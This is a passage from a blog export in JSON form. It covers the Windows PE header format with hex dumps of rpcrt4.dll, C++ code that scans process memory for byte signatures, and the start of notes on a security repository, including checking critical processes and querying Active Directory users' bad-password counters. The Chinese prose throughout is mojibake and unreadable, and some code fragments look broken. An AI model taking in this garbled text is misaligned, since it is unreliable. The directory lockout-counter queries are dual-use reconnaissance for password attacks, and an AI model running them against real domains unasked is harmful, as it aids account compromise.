//æŒ‡å‘ç¬¦å·è¡¨ï¼ˆç”¨äºè°ƒè¯•ï¼‰ DWORD NumberOfSymbols; //ç¬¦å·è¡¨ä¸­ç¬¦å·çš„ä¸ªæ•° WORD SizeOfOptionalHeader; //IMAGE_OPTIONAL_HEADER32ç»“æ„å¤§å° WORD Characteristics; //æ–‡ä»¶å±æ€§&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER; å‚ç…§ä¸Šè¿°ç»“æ„ä½“ï¼Œåˆ†æä¸€ä¸‹ rpcrt4.dll çš„ FileHeader æˆå‘˜ã€‚ PEå¤´å­˜å‚¨å†…å®¹å¦‚ä¸‹æ‰€ç¤ºï¼š 1234Offset 0 1 2 3 4 5 6 7 8 9 A B C D E F000000E0 50 45 00 00 4C 01 06 00 PE L 000000F0 77 7B 41 86 00 00 00 00 00 00 00 00 E0 00 02 21 w&#123;A? ? ! ç°åœ¨æœ‰æ•°æ®ä¹ŸçŸ¥é“ç»“æ„ä½“ï¼Œå¯ä»¥æ ¹æ®å­˜å‚¨çš„å†…å®¹çŸ¥é“ rpcrt4.dll çš„ä¸€äº›ä¿¡æ¯äº†ï¼ˆåœ°å€æ˜¯ç”±ä½ä½å‘é«˜ä½å¢é•¿çš„ï¼Œè¿™é‡Œç›´æ¥å¤åˆ¶ç²˜è´´äº†ï¼Œè¯»è€…çŸ¥é“è¿™å›äº‹å°±è¡Œï¼‰ æˆå‘˜å˜é‡ Machine NumberOfSections TimeDateStamp PointerToSymbolTable NumberOfSymbols SizeOfOptionalHeader Characteristics å¤§å° WORD WORD DWORD DWORD DWORD WORD WORD å€¼ 4C 01 06 00 77 7B 41 86 00 00 00 00 00 00 00 00 E0 00 02 21 è¯´æ˜ 0x014C è¡¨ç¤ºå½“å‰ä½“ç³»ç»“æ„ç±»å‹ä¸º x86 å½“å‰PEæ–‡ä»¶çš„èŠ‚æ•°ï¼Œå½“å‰æ‰€ç¤ºæœ‰ 6 ä¸ª å½“å‰PEæ–‡ä»¶çš„æ—¶é—´æˆ³ ç¬¦å·è¡¨çš„åç§»é‡ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼Œå¦‚æœæ²¡æœ‰ COFF ç¬¦å·è¡¨ï¼Œåˆ™ä¸º 0 ç¬¦å·è¡¨ä¸­çš„ç¬¦å·æ•°ï¼Œå½“å‰ä¸º 0 å¯é€‰æ–‡ä»¶å¤´å¤§å°ï¼Œå½“å‰æ‰€ç¤ºæœ‰ 224 ä¸ª å›¾åƒçš„ç‰¹å¾ 0x2102 è¡¥å…… æœºå™¨æ ‡è¯† æ ‡è¯†åŒºå—çš„æ•°ç›®ï¼Œå…³äºåŒºå—åé¢ä¼šè¯¦ç»†è®² æŒ‡çš„å°±æ˜¯PEæ–‡ä»¶åˆ›å»ºçš„äº‹ä»¶ï¼Œè¿™ä¸ªæ—¶é—´æ˜¯æŒ‡ä»1970å¹´1æœˆ1æ—¥åˆ°åˆ›å»ºè¯¥æ–‡ä»¶çš„æ‰€æœ‰çš„ç§’æ•° ç´§è·Ÿç€IMAGE_FILE_HEADERåé¢çš„æ•°æ®å¤§å°ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œå®ƒå«åšIMAGE_OPTIONAL_HEADER,å…¶å¤§å°ä¾èµ–äºæ˜¯64ä½è¿˜æ˜¯32ä½æ–‡ä»¶ã€‚32ä½æ–‡ä»¶å€¼é€šå¸¸æ˜¯00EOhï¼Œå¯¹äº64ä½å€¼é€šå¸¸ä¸º00F0h æ™®é€šEXEæ–‡ä»¶è¿™ä¸ªå­—æ®µå€¼ä¸º010fhï¼ŒDLLæ–‡ä»¶è¿™ä¸ªå­—æ®µä¸€èˆ¬æ˜¯0210h æœ€åä¸€ä¸ªå‚æ•°å›¾åƒç‰¹å¾ Characteristics çš„å€¼ 0x2102 çš„è¯´æ˜ 0x2000 è¯¥å›¾åƒæ˜¯ä¸€ä¸ªDLLæ–‡ä»¶ï¼Œè™½ç„¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½†ä¸èƒ½ç›´æ¥è¿è¡Œ 0x0100 è®¡ç®—æœºæ”¯æŒ32ä½ 0x0002 è¯¥æ–‡ä»¶æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œï¼ˆæ²¡æœ‰æœªè§£æçš„å¤–éƒ¨å¼•ç”¨ï¼‰ å¯é€‰å¤´ OptionalHeader å¯é€‰PEå¤´ç´§æ¥ç€æ ‡å‡†PEå¤´ï¼Œå…¶å¤§å°åœ¨æ ‡å‡†PEå¤´ä¸­ç»™å‡ºï¼šå¤§å°ä¸º E0H å³224å­—èŠ‚ã€‚_IMAGE_OPTIONAL_HEADERç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š WinNT.h ä¸­çš„å®é™… ç»“æ„IMAGE_OPTIONAL_HEADER32å‘½å ï¼Œ IMAGE_OPTIONAL_HEADER å®šä¹‰ä¸º IMAGE_OPTIONAL_HEADER32ã€‚ ä½†æ˜¯ï¼Œå¦‚æœå®šä¹‰äº† _WIN64 ï¼Œåˆ™ IMAGE_OPTIONAL_HEADER å®šä¹‰ä¸º IMAGE_OPTIONAL_HEADER64ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _IMAGE_OPTIONAL_HEADER &#123; // // Standard fields. // /*+0x00*/ WORD Magic; // æ ‡å¿—å­—, ROM æ˜ åƒï¼ˆ0107hï¼‰,æ™®é€šå¯æ‰§è¡Œæ–‡ä»¶ï¼ˆ010Bhï¼‰ /*+0x02*/ BYTE MajorLinkerVersion; // é“¾æ¥ç¨‹åºçš„ä¸»ç‰ˆæœ¬å· /*+0x03*/ BYTE MinorLinkerVersion; // é“¾æ¥ç¨‹åºçš„æ¬¡ç‰ˆæœ¬å· /*+0x04*/ DWORD SizeOfCode; // æ‰€æœ‰å«ä»£ç çš„èŠ‚çš„æ€»å¤§å° /*+0x08*/ DWORD SizeOfInitializedData; // æ‰€æœ‰å«å·²åˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„æ€»å¤§å° /*+0x0c*/ DWORD SizeOfUninitializedData; // æ‰€æœ‰å«æœªåˆå§‹åŒ–æ•°æ®çš„èŠ‚çš„å¤§å° /*+0x10*/ DWORD AddressOfEntryPoint; // ç¨‹åºæ‰§è¡Œå…¥å£RVA /*+0x14*/ DWORD BaseOfCode; // ä»£ç çš„åŒºå—çš„èµ·å§‹RVA /*+0x18*/ DWORD BaseOfData; // æ•°æ®çš„åŒºå—çš„èµ·å§‹RVA // // NT additional fields. ä»¥ä¸‹æ˜¯å±äºNTç»“æ„å¢åŠ çš„é¢†åŸŸã€‚ // /*+0x1c*/ DWORD ImageBase; // *ç¨‹åºçš„é¦–é€‰è£…è½½åœ°å€ /*+0x20*/ DWORD SectionAlignment; // *å†…å­˜ä¸­çš„åŒºå—çš„å¯¹é½å¤§å° /*+0x24*/ DWORD FileAlignment; // *æ–‡ä»¶ä¸­çš„åŒºå—çš„å¯¹é½å¤§å° /*+0x28*/ WORD MajorOperatingSystemVersion; // è¦æ±‚æ“ä½œç³»ç»Ÿæœ€ä½ç‰ˆæœ¬å·çš„ä¸»ç‰ˆæœ¬å· /*+0x2a*/ WORD MinorOperatingSystemVersion; // è¦æ±‚æ“ä½œç³»ç»Ÿæœ€ä½ç‰ˆæœ¬å·çš„å‰¯ç‰ˆæœ¬å· /*+0x2c*/ WORD MajorImageVersion; // å¯è¿è¡Œäºæ“ä½œç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å· /*+0x2e*/ WORD MinorImageVersion; // å¯è¿è¡Œäºæ“ä½œç³»ç»Ÿçš„æ¬¡ç‰ˆæœ¬å· /*+0x30*/ WORD MajorSubsystemVersion; // è¦æ±‚æœ€ä½å­ç³»ç»Ÿç‰ˆæœ¬çš„ä¸»ç‰ˆæœ¬å· /*+0x32*/ WORD MinorSubsystemVersion; // è¦æ±‚æœ€ä½å­ç³»ç»Ÿç‰ˆæœ¬çš„æ¬¡ç‰ˆæœ¬å· /*+0x34*/ DWORD Win32VersionValue; // è«é¡»æœ‰å­—æ®µï¼Œä¸è¢«ç—…æ¯’åˆ©ç”¨çš„è¯ä¸€èˆ¬ä¸º0 /*+0x38*/ DWORD SizeOfImage; // æ˜ åƒè£…å…¥å†…å­˜åçš„æ€»å°ºå¯¸ /*+0x3c*/ DWORD SizeOfHeaders; // æ‰€æœ‰å¤´+åŒºå—è¡¨çš„å°ºå¯¸å¤§å° /*+0x40*/ DWORD CheckSum; // æ˜ åƒçš„æ ¡æ£€å’Œ /*+0x44*/ WORD Subsystem; // å¯æ‰§è¡Œæ–‡ä»¶æœŸæœ›çš„å­ç³»ç»Ÿ /*+0x46*/ WORD DllCharacteristics; // DllMain()å‡½æ•°ä½•æ—¶è¢«è°ƒç”¨ï¼Œé»˜è®¤ä¸º0 /*+0x48*/ DWORD SizeOfStackReserve; // åˆå§‹åŒ–æ—¶çš„æ ˆå¤§å° /*+0x4c*/ DWORD SizeOfStackCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„æ ˆå¤§å° /*+0x50*/ DWORD SizeOfHeapReserve; // åˆå§‹åŒ–æ—¶ä¿ç•™çš„å †å¤§å° /*+0x54*/ DWORD SizeOfHeapCommit; // åˆå§‹åŒ–æ—¶å®é™…æäº¤çš„å †å¤§å° /*+0x58*/ DWORD LoaderFlags; // ä¸è°ƒè¯•æœ‰å…³ï¼Œé»˜è®¤ä¸º0 /*+0x5c*/ DWORD NumberOfRvaAndSizes; // ä¸‹è¾¹æ•°æ®ç›®å½•çš„é¡¹æ•°ï¼Œè¿™ä¸ªå­—æ®µè‡ªWindows NTå‘å¸ƒä»¥æ¥ï¼Œä¸€ç›´æ˜¯16 /*+0x60*/ IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; // *æ•°æ®ç›®å½•è¡¨&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32; ä¸Šè¿°å…±è®¡ 31 ä¸ªå­—æ®µï¼Œå¸¸ç”¨çš„ä¸€èˆ¬æ˜¯åŠ *çš„å‡ ä¸ªã€‚è¿™é‡Œè¿˜æ˜¯ç®€å•çš„æŒ‰ç…§å†…å­˜å’Œç»“æ„ä½“ä¸€ä¸€å¯¹åº”åˆ†æçœ‹ä¸‹ã€‚ å†…å­˜å¦‚ä¸‹æ‰€ç¤ºï¼š æˆå‘˜å˜é‡ å¤§å° å€¼ è¯´æ˜ è¡¥å…… Magic WORD 0B 01 æ˜ åƒæ–‡ä»¶çš„çŠ¶æ€ï¼Œ0x01 æ ‡è¯†å½“å‰æ˜¯å¯æ‰§è¡Œæ˜ åƒ MajorLinkerVersion BYTE 0E é“¾æ¥å™¨çš„ä¸»è¦ç‰ˆæœ¬å·ï¼Œå½“å‰æ˜¯ 14 MinorLinkerVersion BYTE 14 é“¾æ¥å™¨çš„æ¬¡è¦ç‰ˆæœ¬å·ï¼Œå½“å‰æ˜¯ 20 SizeOfCode DWORD 00 C2 0A 00 å¦‚æœæœ‰å¤šä¸ªä»£ç èŠ‚ï¼Œåˆ™ä¸ºä»£ç èŠ‚çš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰æˆ–æ‰€æœ‰æ­¤ç±»èŠ‚çš„æ€»å’Œã€‚ SizeOfInitializedData DWORD 00 EA 00 00 åˆå§‹åŒ–çš„æ•°æ®èŠ‚çš„å¤§å°ã€‚ä»£ç èŠ‚çš„å¤§å°æˆ–æ‰€æœ‰æ­¤ç±»èŠ‚çš„æ€»å’Œ SizeOfUninitializedData DWORD 00 00 00 00 æœªåˆå§‹åŒ–æ•°æ®èŠ‚çš„å¤§å° AddressOfEntryPoint DWORD 50 D3 03 00 æŒ‡å‘å…¥å£ç‚¹å‡½æ•°çš„æŒ‡é’ˆ BaseOfCode DWORD 00 10 00 00 æŒ‡å‘ä»£ç éƒ¨åˆ†çš„å¼€å¤´çš„æŒ‡é’ˆ BaseOfData DWORD 00 E0 0A 00 æŒ‡å‘æ•°æ®éƒ¨åˆ†å¼€å¤´ï¼ˆç›¸å¯¹äºå›¾åƒåŸºæ•°ï¼‰çš„æŒ‡é’ˆã€‚ ImageBase DWORD 00 00 F8 4E å›¾åƒåŠ è½½åˆ°å†…å­˜ä¸­çš„ç¬¬ä¸€ä¸ªå­—èŠ‚çš„é¦–é€‰åœ°å€ã€‚ æ­¤å€¼æ˜¯ 64K å­—èŠ‚çš„å€æ•°ã€‚ DLL çš„é»˜è®¤å€¼ä¸º 0x10000000ã€‚ åº”ç”¨ç¨‹åºçš„é»˜è®¤å€¼ä¸º 0x00400000ï¼Œ0x00010000 Windows CEé™¤å¤–ã€‚ SectionAlignment DWORD 00 10 00 00 å†…å­˜ä¸­åŠ è½½çš„èŠ‚çš„å¯¹é½æ–¹å¼ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ æ­¤å€¼å¿…é¡»å¤§äºæˆ–ç­‰äº FileAlignment æˆå‘˜ã€‚ é»˜è®¤å€¼æ˜¯ç³»ç»Ÿçš„é¡µå¤§å°ã€‚ FileAlignment DWORD 00 02 00 00 å›¾åƒæ–‡ä»¶ä¸­å„éƒ¨åˆ†çš„åŸå§‹æ•°æ®çš„å¯¹é½æ–¹å¼ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ã€‚ è¯¥å€¼åº”ä¸ºä»‹äº 512 å’Œ 64K ä¹‹é—´çš„å¹‚ (ï¼ˆå«) ï¼‰ã€‚ é»˜è®¤å€¼ä¸º 512ã€‚ å¦‚æœ SectionAlignment æˆå‘˜å°äºç³»ç»Ÿé¡µé¢å¤§å°ï¼Œåˆ™æ­¤æˆå‘˜å¿…é¡»ä¸ SectionAlignment ç›¸åŒã€‚ MajorOperatingSystemVersion WORD 0A 00 æ‰€éœ€æ“ä½œç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·ã€‚ 0x0A ä¸º 10 MinorOperatingSystemVersion WORD 00 00 æ‰€éœ€æ“ä½œç³»ç»Ÿçš„æ¬¡è¦ç‰ˆæœ¬å·ã€‚ MajorImageVersion WORD 0A 00 æ˜ åƒçš„ä¸»ç‰ˆæœ¬å·ã€‚ MinorImageVersion WORD 00 00 æ˜ åƒçš„æ¬¡è¦ç‰ˆæœ¬å·ã€‚ MajorSubsystemVersion WORD 0A 00 å­ç³»ç»Ÿçš„ä¸»ç‰ˆæœ¬å·ã€‚ MinorSubsystemVersion WORD 00 00 å­ç³»ç»Ÿçš„æ¬¡è¦ç‰ˆæœ¬å·ã€‚ Win32VersionValue DWORD 00 00 00 00 æ­¤æˆå‘˜æ˜¯ä¿ç•™çš„ï¼Œå¿…é¡»ä¸º 0ã€‚ SizeOfImage DWORD 00 F0 0B 00 å›¾åƒçš„å¤§å°ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½ï¼‰ï¼ŒåŒ…æ‹¬æ‰€æœ‰æ ‡å¤´ã€‚ å¿…é¡»æ˜¯ SectionAlignment çš„å€æ•°ã€‚ SizeOfHeaders DWORD 00 04 00 00 ä»¥ä¸‹é¡¹çš„ç»„åˆå¤§å°ï¼Œèˆå…¥ä¸º FileAlignment æˆå‘˜ä¸­æŒ‡å®šçš„å€¼çš„å€æ•°ã€‚ CheckSum DWORD 3B 06 0C 00 æ˜ åƒæ–‡ä»¶æ ¡éªŒå’Œã€‚ ä»¥ä¸‹æ–‡ä»¶åœ¨åŠ è½½æ—¶è¿›è¡ŒéªŒè¯ï¼šæ‰€æœ‰é©±åŠ¨ç¨‹åºã€åœ¨å¯åŠ¨æ—¶åŠ è½½çš„ä»»ä½• DLLï¼Œä»¥åŠåŠ è½½åˆ°å…³é”®ç³»ç»Ÿè¿›ç¨‹ä¸­çš„ä»»ä½• DLLã€‚ Subsystem WORD 03 00 è¿è¡Œæ­¤æ˜ åƒæ‰€éœ€çš„å­ç³»ç»Ÿã€‚ å®šä¹‰äº†ä»¥ä¸‹å€¼ã€‚ 0x03 æ ‡è¯† windows å­—ç¬¦è†œç‰‡å¼ç”¨æˆ·ç•Œé¢ï¼ˆCUIï¼‰ç³»ç»Ÿ DllCharacteristics WORD 40 41 å›¾åƒçš„ DLL ç‰¹å¾ã€‚ å®šä¹‰äº†ä»¥ä¸‹å€¼ã€‚ SizeOfStackReserve DWORD 00 00 04 00 SizeOfStackCommit DWORD 00 10 00 00 SizeOfHeapReserve DWORD 00 00 10 00 SizeOfHeapCommit DWORD 00 10 00 00 LoaderFlags DWORD 00 00 00 00 NumberOfRvaAndSizes DWORD 10 00 00 00 DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES] IMAGE_DATA_DIRECTORY 16ä¸ªæŒ‡é’ˆåœ°å€ï¼Œå¤§å°ä¸º 80H è¿™ä¸ªæ˜¯ä¸€ä¸ªæŒ‡é’ˆç±»å‹ï¼ŒæŒ‡å‘ IMAGE_DATA_DIRECTORY ç»“æ„çš„æŒ‡é’ˆã€‚ä¼šæ ¹æ®ä¼ å…¥çš„ç´¢å¼•å·è¿”å›ä¸åŒæŒ‡å‘çš„ç»“æ„ä½“ æœ€åä¸€ä¸ªæˆå‘˜å˜é‡ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼Œè¯¦è§IMAGE_DATA_DIRECTORY (winnt.h) - Win32 apps | Microsoft Learnï¼š 12345struct _IMAGE_DATA_DIRECTORY&#123; DWORD VirtualAddress; DWORD Size;&#125;;//å ç”¨16*8 = 128Byte = 80H = E0H(å¯é€‰PEå¤´é»˜è®¤å¤§å°) - 60H(å‰é¢æ‰€æœ‰æˆå‘˜å›ºå®šå ç”¨å¤§å°) å…³äºæœ€åä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œå¯æšä¸¾çš„ IMAGE_NUMBEROF_DIRECTORY_ENTRIES ç´¢å¼•æ€»å…±æœ‰15ä¸ªï¼Œå¤–åŠ ä¸€ä¸ªä¿ç•™æŒ‡é’ˆã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ DataDirectory ä½ç½®å­˜æ”¾äº† 16 ä¸ªæŒ‡é’ˆã€‚å¯ä»¥å‚è€ƒä¹‹å‰çš„PEå¤´å¯¹ç…§ä¸€ä¸‹ï¼Œå‰©ä¸‹çš„PEå†…å­˜åˆšå¥½å­˜æ”¾äº† 16 ä¸ªæŒ‡é’ˆï¼Œå‚è€ƒ PE å—çš„æ€»å¤§å°ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†å¤§å°ä¹Ÿåˆšå¥½ä¸º 80h80h80h ã€‚ $ 16 * 8 = 128 = 80H$ å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š èŠ‚è¡¨ ä¸‹ç¯‡æ–‡ç« è®°å½• èŠ‚è¡¨æ•°æ® ä¸‹ç¯‡æ–‡ç« è®°å½• 0x03 è¡¥å……ä¸€æ®µä»£ç ï¼Œæ¼”ç¤ºç®€å•è·å– Section å„ä¸ªæ®µçš„ä¿¡æ¯ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101ULONGLONG FindSignatureCode::operator()(CString module, std::vector&lt;ULONG&gt; signatureCodes)&#123; DBGTRACE; if (signatureCodes.size() == 0) &#123; return 0; &#125; ULONGLONG addr = 0; DWORD cbSize; HMODULE* pHmodule = NULL; ModuleSectionInfo_T ModuleSectionInfo; HANDLE hModuleSnap = ::CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, GetCurrentProcessId()); // æ¨¡å—å¿«ç…§å¥æŸ„ MODULEENTRY32 me32 = &#123; 0 &#125;; // æ¨¡å—å…¥å£ me32.dwSize = sizeof(MODULEENTRY32); // ç”³è¯·ç©ºé—´ // æ‰“å°æ¨¡å—å while (::Module32Next(hModuleSnap, &amp;me32)) &#123; if (module.CompareNoCase(me32.szModule) == 0) &#123; Debug_Run(L&quot;Find Module(%s)&quot;, me32.szModule); break; &#125; &#125; ULONGLONG ulModuleBase = (ULONGLONG)me32.modBaseAddr; ULONGLONG ulModuleSize = (ULONGLONG)me32.modBaseSize; HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, GetCurrentProcessId()); CHAR* szBuffer = new CHAR[ulModuleSize]; ZeroMemory(szBuffer, ulModuleSize); SIZE_T sReadSize = 0; if (ReadProcessMemory(hProcess, (LPCVOID)ulModuleBase, szBuffer, ulModuleSize, &amp;sReadSize)) &#123; for (size_t offset = 0; offset &lt; ulModuleSize - signatureCodes.size() * 4; offset++) &#123; int i = 0; for (; i &lt; signatureCodes.size(); i++) &#123; ULONGLONG ReadMem = (*(ULONG*)(szBuffer + offset + (i * 4))); ULONGLONG SigCode = signatureCodes[i]; if (SigCode != ReadMem) &#123; break; &#125;&#125; if (i == signatureCodes.size()) &#123; addr = (ulModuleBase + offset); Debug_Run(L&quot;Found Signature Code:%lld&quot;, addr); break; &#125; &#125; &#125; else &#123; Debug_Error(L&quot;ReadProcessMemory Failed %d&quot;, GetLastError()); &#125;#if 0 if (!EnumProcessModulesEx(hpro, NULL, 0, &amp;cbSize, LIST_MODULES_ALL)) goto End; pHmodule = (HMODULE*)malloc(cbSize); if (pHmodule == NULL) goto End; if (!EnumProcessModulesEx(hpro, pHmodule, cbSize, &amp;cbSize, LIST_MODULES_ALL)) goto End; for (ULONG i = 0; i &lt; cbSize / sizeof(*pHmodule); i++) &#123; GetModulePdataSection(hpro, me32.hModule, ); &#125;#endif // 0 if(!GetModulePdataSection(hProcess, me32.hModule, &amp;ModuleSectionInfo)) goto End; VOID PTR_T PTR_T pCandidate; PIMAGE_IA64_RUNTIME_FUNCTION_ENTRY pRuntimeEntry; PUNWIND_INFO pUnWindInfo;#pragma warning(push)#pragma warning(disable:4305) pCandidate = (VOID PTR_T PTR_T)ModuleSectionInfo.pBase;#pragma warning(pop) &#123; if (!ReadProcessMemory(hProcess, pCandidate, &amp;pRuntimeEntry, sizeof(VOID PTR_T), NULL)) goto End; for (int i = pRuntimeEntry-&gt;BeginAddress; i &lt; pRuntimeEntry-&gt;EndAddress; i += sizeof(VOID PTR_T)) Debug_Run(L&quot;RUNTIME_FUNCTION-%d: %p&quot;,i , (VOID PTR_T)i); pUnWindInfo = (PUNWIND_INFO)pRuntimeEntry-&gt;UnwindInfoAddress; &#125; CloseHandle(hProcess); CloseHandle(hModuleSnap);End: return addr;&#125; GetModulePdataSection çš„å®ç° 123456789101112131415161718192021222324252627282930313233343536373839404142BOOL FindSignatureCode::GetModulePdataSection(HANDLE hProcess, VOID * pModule, ModuleSectionInfo_T * pModuleSectionInfo)&#123; IMAGE_DOS_HEADER ImageDosHeader; IMAGE_NT_HEADERS ImageNtHeaders; IMAGE_SECTION_HEADER* pImageSectionHeader; UINT SectionIdx; IMAGE_SECTION_HEADER ImageSectionHeader; UCHAR* pBase = (UCHAR*)pModule; BOOL bResult = FALSE; if (!ReadProcessMemory(hProcess, pBase, &amp;ImageDosHeader, sizeof(ImageDosHeader), NULL)) goto End; if (ImageDosHeader.e_magic != IMAGE_DOS_SIGNATURE) goto End; if (!ReadProcessMemory(hProcess, pBase + ImageDosHeader.e_lfanew, &amp;ImageNtHeaders, sizeof(ImageNtHeaders), NULL)) goto End; if (ImageNtHeaders.Signature != IMAGE_NT_SIGNATURE) goto End; // // For 64bits, add the size of IMAGE_NT_HEADERS64 to its own base to get the base of the IMAGE_SECTION_HEADER table //#ifdef _WIN64#pragma warning(push)#pragma warning(disable:4127) if (SQLPLUGIN_IS_WOW64 == TRUE) pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS));#pragma warning(pop) else#endif pImageSectionHeader = (IMAGE_SECTION_HEADER*)((UINT_PTR)pBase + ImageDosHeader.e_lfanew + sizeof(IMAGE_NT_HEADERS32)); for (SectionIdx = 0; SectionIdx &lt; ImageNtHeaders.FileHeader.NumberOfSections; SectionIdx++) &#123; if (!ReadProcessMemory(hProcess, &amp;pImageSectionHeader[SectionIdx], &amp;ImageSectionHeader, sizeof(ImageSectionHeader), NULL)) goto End; const char* SectionName = (const char*)ImageSectionHeader.Name; if (strncmp(SectionName, gSQLPluginPDataSectionName, sizeof(gSQLPluginPDataSectionName)) == 0) &#123; pModuleSectionInfo-&gt;pBase = pBase + ImageSectionHeader.VirtualAddress; pModuleSectionInfo-&gt;Size = ImageSectionHeader.Misc.VirtualSize; bResult = TRUE; break; &#125; &#125;End: return (bResult);&#125; ç›¸å…³ç»“æ„ä½“å¦‚ä¸‹æ‰€ç¤ºï¼š 12345678910111213141516171819const char gSQLPluginPDataSectionName[] = &quot;.pdata&quot;;typedef struct _ModuleSectionInfo_T &#123; VOID* pBase; UINT Size;&#125;ModuleSectionInfo_T;#ifdef _WIN64// See http://mimagesdn.microsoft.com/en-us/library/ddssxxy8.aspxtypedef struct _UNWIND_INFO &#123; unsigned char Version : 3; unsigned char Flags : 5; unsigned char SizeOfProlog; unsigned char CountOfCodes; unsigned char FrameRegister : 4; unsigned char FrameOffset : 4; ULONG ExceptionHandler;&#125; UNWIND_INFO, *PUNWIND_INFO;#endif","tags":[],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"PE","slug":"wiki/PE","permalink":"https://hodlyounger.github.io/categories/wiki/PE/"}]},{"title":"ã€Aå­¦ä¹ ã€‘Homework-of-C-Language","date":"2024-08-31T01:41:20.146Z","path":"wiki/Homework-c-language/index/","text":"æ¦‚è¿°ï¼š3gstudent/Homework-of-C-Language: C/C++ code examples of my blog. ä»“åº“å­¦ä¹ è®°å½• [toc] 0x01 CheckCriticalProess è¯´æ˜: æ£€æŸ¥è¿›ç¨‹æ˜¯ä¸æ˜¯å…³é”®è¿›ç¨‹ ç›¸å…³é“¾æ¥ï¼š NtQueryInformationProcess å‡½æ•° (winternl.h) - Win32 apps | Microsoft Learn windowså…³é”®è¿›ç¨‹åˆ—è¡¨ï¼š å†…æ ¸çš„ç³»ç»Ÿè¿›ç¨‹ï¼ˆNTOSKrnl.exeï¼‰ ä¼šè¯ç®¡ç†å™¨å­ç³»ç»Ÿï¼ˆSMSS.exeï¼‰ å®¢æˆ·ç«¯æœåŠ¡å™¨è¿è¡Œæ—¶å­ç³»ç»Ÿï¼ˆCSRSS.exeï¼‰ Windowsç™»å½•ï¼ˆWinLogon.exeï¼‰ Windows Initï¼ˆWinInit.exeï¼‰ ä»…é€‚ç”¨äºRDPçš„ Windowsç™»å½•ç”¨æˆ·ç•Œé¢ä¸»æœºï¼ˆLogonUI.exeï¼‰ æœ¬åœ°å®‰å…¨æœºæ„è¿›ç¨‹ï¼ˆlsass.exeï¼‰ æœåŠ¡æ§åˆ¶ç®¡ç†å™¨ï¼ˆServices.exeï¼‰ ä½¿ç”¨RPCSSæˆ–Dcom / PnPçš„ æœåŠ¡ä¸»æœºï¼ˆsvchost.exeï¼‰ æ¡Œé¢çª—å£ç®¡ç†å™¨ï¼ˆDWM.exeï¼‰ åŠ ä¸Šå…¶ä»–å¯é€‰æµç¨‹ï¼Œå¦‚æ€§èƒ½ç›‘æ§ æˆ–Internet Information Serverï¼ˆISSï¼‰ æ­¥éª¤ è·å–è¿›ç¨‹ PID é€šè¿‡ PID æ‰“å¼€è¿›ç¨‹ è·å– ntdll.dll ä¸­çš„å¯¼å‡ºå‡½æ•° NtQueryInformationProcess é€šè¿‡ NtQueryInformationProcess è·å– ProcessBreakOnTermination çš„å€¼ ä»£ç è¯´æ˜ ä¸»è¦é€šè¿‡ ntdll ä¸­çš„æ¥å£ NtQueryInformationProcess è·å– ProcessBreakOnTermination çš„å€¼ã€‚ä» windows 8.1 å¼€å§‹å¯ä»¥ä½¿ç”¨ IsProcessCritical æ¥åˆ¤æ–­ã€‚ 12345678status = NtQueryInformationProcess(hProcess, ProcessBreakOnTermination, &amp;breakOnTermination, sizeof(ULONG), NULL);if (status &lt; 0) printf(&quot;[!]NtQueryInformationProcess error\\n&quot;);if (breakOnTermination == 1) printf(&quot;[+]The process is critical\\n&quot;);else printf(&quot;[!]The process is not critical\\n&quot;); 0x02 CheckUserBadPwdPolicy è¯´æ˜ï¼šè·å–åŸŸå†…ç”¨æˆ·çš„ badPasswordTime å’Œ badPwdCount å±æ€§ ç›¸å…³é“¾æ¥ï¼š ADsOpenObject å‡½æ•° (adshlp.h) - Win32 apps | Microsoft Learn è¯¥å‡½æ•°ç”¨æˆ·ç»‘å®šåˆ° ADSI å¯¹è±¡ï¼Œä½†å¦‚æœä¼ å…¥çš„ç”¨æˆ·åå’Œå¯†ç å‡ä¸ºç©ºï¼Œåˆ™ä¼šä½¿ç”¨è¿è¡Œç¨‹åºçš„ç”¨æˆ·è´¦æˆ·ä¸Šçº¿æ–‡è¿›è¡Œç»‘å®šã€‚ å…³é”®ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244HRESULT FindUsers(IDirectorySearch* pContainerToSearch, //IDirectorySearch pointer to Partitions container. LPOLESTR szFilter, //Filter for finding specific crossrefs. //NULL returns all attributeSchema objects. LPOLESTR* 